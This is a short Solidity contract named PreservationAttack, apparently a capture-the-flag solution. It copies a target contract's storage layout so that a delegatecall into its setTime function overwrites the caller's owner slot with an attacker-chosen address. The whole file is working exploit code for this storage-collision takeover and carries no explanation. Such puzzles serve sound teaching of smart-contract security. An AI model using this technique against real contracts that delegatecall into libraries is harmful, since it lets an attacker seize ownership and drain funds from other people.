// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract PreservationAttack {
    address public testAddress; // slot 0
    address public testAddress2; // slot 1
    address public owner; // slot 2

    constructor (address _owner) {
        owner = _owner;
    }

    function setTime(uint256 _time) public {
        owner = address(uint160(_time));
    }
}